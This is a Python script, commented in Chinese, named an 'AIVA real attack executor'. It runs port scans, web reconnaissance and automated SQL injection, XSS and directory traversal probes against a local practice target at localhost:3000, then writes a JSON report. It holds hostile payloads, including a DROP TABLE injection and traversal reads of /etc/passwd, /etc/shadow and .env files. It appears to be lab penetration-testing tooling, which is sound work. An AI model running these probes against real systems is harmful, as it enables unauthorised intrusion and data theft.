#!/usr/bin/env python3
"""
AIVA 真實攻擊執行器
用途: 將模擬攻擊轉換為真實工具執行
基於: 實際靶場環境的真實滲透測試
"""

import asyncio
import subprocess
import requests
import json
import socket
import time
from pathlib import Path
from typing import Dict, List, Any, Optional
from urllib.parse import urljoin, urlparse
import sys

# 添加 AIVA 模組路徑
sys.path.append(str(Path(__file__).parent.parent.parent.parent))

class RealAttackExecutor:
    """真實攻擊執行器 - 連接實際工具和靶場"""
    
    def __init__(self):
        self.target_base = "http://localhost:3000"
        self.session = requests.Session()
        self.session.timeout = 10
        self.attack_results = []
        
        # 常用工具檢查
        self.available_tools = self._check_available_tools()
        
    def _check_available_tools(self) -> Dict[str, bool]:
        """檢查可用的攻擊工具"""
        tools = {
            'curl': self._check_command('curl --version'),
            'nmap': self._check_command('nmap --version'),
            'python': self._check_command('python --version'),
            'powershell': self._check_command('powershell -Command "Get-Host"'),
        }
        
        print("🔧 可用工具檢查:")
        for tool, available in tools.items():
            status = "✅ 可用" if available else "❌ 不可用"
            print(f"   {tool}: {status}")
            
        return tools
    
    def _check_command(self, command: str) -> bool:
        """檢查命令是否可用"""
        try:
            result = subprocess.run(
                command.split(), 
                capture_output=True, 
                text=True, 
                timeout=5
            )
            return result.returncode == 0
        except:
            return False
    
    async def real_port_scan(self, target: str = "localhost") -> Dict[str, Any]:
        """真實端口掃描"""
        print(f"🔍 執行真實端口掃描: {target}")
        
        # 使用 Python socket 進行快速掃描
        open_ports = await self._socket_scan(target, [80, 443, 3000, 8080, 22, 21, 23, 25, 53, 110, 995, 143, 993])
        
        # 如果有 nmap，使用更詳細的掃描
        nmap_results = {}
        if self.available_tools.get('nmap'):
            nmap_results = await self._nmap_scan(target, open_ports)
        
        results = {
            "target": target,
            "scan_type": "real_port_scan",
            "open_ports": open_ports,
            "nmap_details": nmap_results,
            "timestamp": time.time()
        }
        
        self.attack_results.append(results)
        return results
    
    async def _socket_scan(self, host: str, ports: List[int]) -> List[Dict[str, Any]]:
        """使用 socket 掃描端口"""
        open_ports = []
        
        for port in ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((host, port))
                sock.close()
                
                if result == 0:
                    # 嘗試服務識別
                    service_info = await self._identify_service(host, port)
                    open_ports.append({
                        "port": port,
                        "state": "open",
                        "service": service_info
                    })
                    print(f"   ✅ 端口 {port} 開放 - {service_info.get('name', 'unknown')}")
                    
            except Exception as e:
                continue
                
        return open_ports
    
    async def _identify_service(self, host: str, port: int) -> Dict[str, Any]:
        """識別服務類型"""
        service_map = {
            21: {"name": "ftp", "description": "File Transfer Protocol"},
            22: {"name": "ssh", "description": "Secure Shell"},
            23: {"name": "telnet", "description": "Telnet"},
            25: {"name": "smtp", "description": "Simple Mail Transfer Protocol"},
            53: {"name": "dns", "description": "Domain Name System"},
            80: {"name": "http", "description": "HTTP Web Server"},
            110: {"name": "pop3", "description": "Post Office Protocol v3"},
            143: {"name": "imap", "description": "Internet Message Access Protocol"},
            443: {"name": "https", "description": "HTTP Secure"},
            993: {"name": "imaps", "description": "IMAP Secure"},
            995: {"name": "pop3s", "description": "POP3 Secure"},
            3000: {"name": "http-dev", "description": "Development Web Server"},
            8080: {"name": "http-proxy", "description": "HTTP Proxy"}
        }
        
        default_info = {"name": "unknown", "description": "Unknown service"}
        service_info = service_map.get(port, default_info)
        
        # 對 HTTP 服務進行更詳細檢查
        if port in [80, 443, 3000, 8080]:
            try:
                protocol = "https" if port == 443 else "http"
                url = f"{protocol}://{host}:{port}"
                response = requests.get(url, timeout=3)
                service_info.update({
                    "status_code": response.status_code,
                    "server": response.headers.get('Server', 'Unknown'),
                    "content_length": len(response.content),
                    "accessible": True
                })
            except:
                service_info["accessible"] = False
                
        return service_info
    
    async def _nmap_scan(self, target: str, known_ports: List[Dict]) -> Dict[str, Any]:
        """使用 nmap 進行詳細掃描"""
        try:
            ports_str = ",".join([str(p["port"]) for p in known_ports])
            command = f"nmap -sV -p {ports_str} {target}"
            
            result = subprocess.run(
                command.split(),
                capture_output=True,
                text=True,
                timeout=30
            )
            
            return {
                "command": command,
                "returncode": result.returncode,
                "stdout": result.stdout,
                "success": result.returncode == 0
            }
        except Exception as e:
            return {"error": str(e), "success": False}
    
    async def real_web_reconnaissance(self, target_url: str = None) -> Dict[str, Any]:
        """真實 Web 偵察"""
        if not target_url:
            target_url = self.target_base
            
        print(f"🌐 執行 Web 偵察: {target_url}")
        
        results = {
            "target_url": target_url,
            "scan_type": "web_reconnaissance",
            "timestamp": time.time(),
            "findings": {}
        }
        
        # 1. 基礎 HTTP 請求
        try:
            response = self.session.get(target_url)
            results["findings"]["basic_info"] = {
                "status_code": response.status_code,
                "headers": dict(response.headers),
                "content_length": len(response.content),
                "response_time": response.elapsed.total_seconds()
            }
            print(f"   ✅ HTTP 響應: {response.status_code}")
            
            # 2. 檢查常見路徑
            common_paths = [
                "/admin", "/login", "/dashboard", "/api", 
                "/robots.txt", "/sitemap.xml", "/.env",
                "/config", "/backup", "/test"
            ]
            
            accessible_paths = []
            for path in common_paths:
                try:
                    test_url = urljoin(target_url, path)
                    resp = self.session.get(test_url, timeout=3)
                    if resp.status_code != 404:
                        accessible_paths.append({
                            "path": path,
                            "status_code": resp.status_code,
                            "content_length": len(resp.content)
                        })
                        print(f"   🔍 發現路徑: {path} ({resp.status_code})")
                except:
                    continue
                    
            results["findings"]["accessible_paths"] = accessible_paths
            
            # 3. 技術指紋識別
            results["findings"]["technology_stack"] = self._identify_tech_stack(response)
            
        except Exception as e:
            results["error"] = str(e)
            print(f"   ❌ Web 偵察失敗: {e}")
        
        self.attack_results.append(results)
        return results
    
    def _identify_tech_stack(self, response) -> Dict[str, Any]:
        """識別技術棧"""
        tech_stack = {}
        
        # 從 headers 識別
        headers = response.headers
        
        # Server header
        server = headers.get('Server', '')
        if server:
            tech_stack['server'] = server
            
        # X-Powered-By header
        powered_by = headers.get('X-Powered-By', '')
        if powered_by:
            tech_stack['powered_by'] = powered_by
            
        # Content-Type
        content_type = headers.get('Content-Type', '')
        if content_type:
            tech_stack['content_type'] = content_type
            
        # 從內容識別框架
        content = response.text.lower()
        
        # JavaScript 框架檢測
        js_frameworks = {
            'react': ['react', '_react', '__reactinternalinstance'],
            'vue': ['vue.js', '__vue__', 'v-'],
            'angular': ['angular', 'ng-'],
            'jquery': ['jquery', '$'],
            'bootstrap': ['bootstrap']
        }
        
        detected_frameworks = []
        for framework, patterns in js_frameworks.items():
            if any(pattern in content for pattern in patterns):
                detected_frameworks.append(framework)
                
        if detected_frameworks:
            tech_stack['javascript_frameworks'] = detected_frameworks
            
        return tech_stack
    
    async def real_vulnerability_scan(self, target_url: str = None) -> Dict[str, Any]:
        """真實漏洞掃描"""
        if not target_url:
            target_url = self.target_base
            
        print(f"🔍 執行漏洞掃描: {target_url}")
        
        results = {
            "target_url": target_url,
            "scan_type": "vulnerability_scan",
            "timestamp": time.time(),
            "vulnerabilities": []
        }
        
        # 1. SQL 注入測試
        sql_results = await self._test_sql_injection(target_url)
        if sql_results["potential_vulnerabilities"]:
            results["vulnerabilities"].extend(sql_results["potential_vulnerabilities"])
            
        # 2. XSS 測試
        xss_results = await self._test_xss(target_url)
        if xss_results["potential_vulnerabilities"]:
            results["vulnerabilities"].extend(xss_results["potential_vulnerabilities"])
            
        # 3. 目錄遍歷測試
        directory_results = await self._test_directory_traversal(target_url)
        if directory_results["potential_vulnerabilities"]:
            results["vulnerabilities"].extend(directory_results["potential_vulnerabilities"])
        
        results["total_vulnerabilities"] = len(results["vulnerabilities"])
        print(f"   📊 發現 {results['total_vulnerabilities']} 個潛在漏洞")
        
        self.attack_results.append(results)
        return results
    
    async def _test_sql_injection(self, base_url: str) -> Dict[str, Any]:
        """SQL 注入測試"""
        print("   🔍 測試 SQL 注入漏洞...")
        
        # 常見的 SQL 注入 payload
        sql_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "'; DROP TABLE users;--",
            "' UNION SELECT 1,2,3--",
            "admin'--",
            "1' OR '1'='1' #"
        ]
        
        # 可能存在參數的路徑
        test_paths = [
            "/login",
            "/search",
            "/user",
            "/api/login",
            "/admin/login"
        ]
        
        vulnerabilities = []
        
        for path in test_paths:
            test_url = urljoin(base_url, path)
            
            for payload in sql_payloads:
                try:
                    # GET 參數測試
                    params = {'id': payload, 'user': payload, 'search': payload}
                    response = self.session.get(test_url, params=params, timeout=5)
                    
                    # 檢查 SQL 錯誤指示器
                    error_indicators = [
                        'sql syntax', 'mysql_fetch', 'ORA-', 'Microsoft OLE DB',
                        'PostgreSQL', 'Warning: mysql_', 'valid MySQL result',
                        'SQLite', 'sqlite3.OperationalError'
                    ]
                    
                    content_lower = response.text.lower()
                    for indicator in error_indicators:
                        if indicator.lower() in content_lower:
                            vulnerabilities.append({
                                "type": "SQL Injection",
                                "severity": "High",
                                "url": test_url,
                                "payload": payload,
                                "method": "GET",
                                "evidence": indicator,
                                "description": f"Possible SQL injection vulnerability detected with payload: {payload}"
                            })
                            print(f"      ⚠️ 可能的 SQL 注入: {path} (payload: {payload[:20]}...)")
                            break
                            
                except Exception as e:
                    continue
        
        return {"potential_vulnerabilities": vulnerabilities}
    
    async def _test_xss(self, base_url: str) -> Dict[str, Any]:
        """XSS 測試"""
        print("   🔍 測試 XSS 漏洞...")
        
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "';alert('XSS');//"
        ]
        
        test_paths = ["/search", "/comment", "/contact", "/feedback"]
        vulnerabilities = []
        
        for path in test_paths:
            test_url = urljoin(base_url, path)
            
            for payload in xss_payloads:
                try:
                    # GET 參數測試
                    params = {'q': payload, 'search': payload, 'input': payload}
                    response = self.session.get(test_url, params=params, timeout=5)
                    
                    # 檢查 payload 是否被反射
                    if payload in response.text and 'text/html' in response.headers.get('content-type', ''):
                        vulnerabilities.append({
                            "type": "Reflected XSS",
                            "severity": "Medium",
                            "url": test_url,
                            "payload": payload,
                            "method": "GET",
                            "description": f"Possible XSS vulnerability - payload reflected in response"
                        })
                        print(f"      ⚠️ 可能的 XSS: {path}")
                        
                except Exception as e:
                    continue
        
        return {"potential_vulnerabilities": vulnerabilities}
    
    async def _test_directory_traversal(self, base_url: str) -> Dict[str, Any]:
        """目錄遍歷測試"""
        print("   🔍 測試目錄遍歷漏洞...")
        
        traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "../../../../etc/shadow",
            "../../../config/database.yml",
            "../../.env"
        ]
        
        test_paths = ["/file", "/download", "/view", "/image", "/document"]
        vulnerabilities = []
        
        for path in test_paths:
            test_url = urljoin(base_url, path)
            
            for payload in traversal_payloads:
                try:
                    params = {'file': payload, 'path': payload, 'id': payload}
                    response = self.session.get(test_url, params=params, timeout=5)
                    
                    # 檢查是否成功讀取系統文件
                    sensitive_content = [
                        'root:', '/bin/bash', '[mysql]', 'localhost',
                        'password', 'SECRET_KEY', 'database'
                    ]
                    
                    content_lower = response.text.lower()
                    for indicator in sensitive_content:
                        if indicator.lower() in content_lower and len(response.text) > 100:
                            vulnerabilities.append({
                                "type": "Directory Traversal",
                                "severity": "High", 
                                "url": test_url,
                                "payload": payload,
                                "method": "GET",
                                "evidence": indicator,
                                "description": f"Possible directory traversal - sensitive content detected"
                            })
                            print(f"      ⚠️ 可能的目錄遍歷: {path}")
                            break
                            
                except Exception as e:
                    continue
        
        return {"potential_vulnerabilities": vulnerabilities}
    
    async def execute_real_attack_plan(self, plan: Dict[str, Any]) -> Dict[str, Any]:
        """執行真實攻擊計畫"""
        print(f"🚀 執行真實攻擊計畫: {plan.get('name', 'Unknown')}")
        
        execution_results = {
            "plan_name": plan.get('name'),
            "start_time": time.time(),
            "steps_executed": [],
            "total_findings": 0,
            "success": True
        }
        
        for i, step in enumerate(plan.get('steps', [])):
            print(f"\n📋 執行步驟 {i+1}: {step.get('description', step.get('action'))}")
            
            step_result = None
            try:
                if step['action'] == 'port_scan':
                    step_result = await self.real_port_scan(step.get('parameters', {}).get('target', 'localhost'))
                elif step['action'] == 'web_crawl':
                    step_result = await self.real_web_reconnaissance()
                elif step['action'] == 'sql_injection_test':
                    step_result = await self.real_vulnerability_scan()
                else:
                    print(f"   ⚠️ 不支援的動作: {step['action']}")
                    step_result = {"error": f"Unsupported action: {step['action']}"}
                
                execution_results["steps_executed"].append({
                    "step_number": i + 1,
                    "action": step['action'],
                    "result": step_result,
                    "success": "error" not in step_result
                })
                
                # 統計發現的問題
                if step_result and isinstance(step_result, dict):
                    if 'vulnerabilities' in step_result:
                        execution_results["total_findings"] += len(step_result['vulnerabilities'])
                    elif 'open_ports' in step_result:
                        execution_results["total_findings"] += len(step_result['open_ports'])
                
            except Exception as e:
                print(f"   ❌ 步驟執行失敗: {e}")
                execution_results["steps_executed"].append({
                    "step_number": i + 1,
                    "action": step['action'],
                    "error": str(e),
                    "success": False
                })
                execution_results["success"] = False
        
        execution_results["end_time"] = time.time()
        execution_results["duration"] = execution_results["end_time"] - execution_results["start_time"]
        
        print(f"\n📊 攻擊計畫執行完成:")
        print(f"   - 執行時間: {execution_results['duration']:.2f} 秒")
        print(f"   - 執行步驟: {len(execution_results['steps_executed'])}")
        print(f"   - 發現問題: {execution_results['total_findings']}")
        print(f"   - 整體成功: {'✅' if execution_results['success'] else '❌'}")
        
        return execution_results
    
    def generate_attack_report(self) -> Dict[str, Any]:
        """生成攻擊報告"""
        if not self.attack_results:
            return {"error": "No attack results available"}
        
        report = {
            "report_time": time.time(),
            "target_info": {
                "base_url": self.target_base,
                "total_scans": len(self.attack_results)
            },
            "summary": {
                "total_vulnerabilities": 0,
                "open_ports": [],
                "accessible_paths": [],
                "technology_stack": {}
            },
            "detailed_results": self.attack_results
        }
        
        # 統計結果
        for result in self.attack_results:
            if result.get("scan_type") == "vulnerability_scan":
                report["summary"]["total_vulnerabilities"] += len(result.get("vulnerabilities", []))
            elif result.get("scan_type") == "real_port_scan":
                report["summary"]["open_ports"].extend(result.get("open_ports", []))
            elif result.get("scan_type") == "web_reconnaissance":
                findings = result.get("findings", {})
                if "accessible_paths" in findings:
                    report["summary"]["accessible_paths"].extend(findings["accessible_paths"])
                if "technology_stack" in findings:
                    report["summary"]["technology_stack"].update(findings["technology_stack"])
        
        return report

# 主要執行函數
async def main():
    """主函數 - 真實攻擊執行演示"""
    print("🚀 AIVA 真實攻擊執行器")
    print("🎯 目標: http://localhost:3000")
    print("=" * 60)
    
    executor = RealAttackExecutor()
    
    # 定義真實攻擊計畫
    real_attack_plan = {
        "name": "真實靶場滲透測試",
        "target": "http://localhost:3000",
        "steps": [
            {
                "action": "port_scan",
                "description": "掃描目標開放端口",
                "parameters": {"target": "localhost"}
            },
            {
                "action": "web_crawl",
                "description": "Web 應用偵察"
            },
            {
                "action": "sql_injection_test", 
                "description": "SQL 注入漏洞掃描"
            }
        ]
    }
    
    # 執行真實攻擊
    results = await executor.execute_real_attack_plan(real_attack_plan)
    
    # 生成報告
    report = executor.generate_attack_report()
    
    # 儲存報告
    report_file = f"real_attack_report_{int(time.time())}.json"
    with open(report_file, 'w', encoding='utf-8') as f:
        json.dump(report, f, indent=2, ensure_ascii=False)
    
    print(f"\n📄 攻擊報告已儲存: {report_file}")
    return results, report

if __name__ == "__main__":
    asyncio.run(main())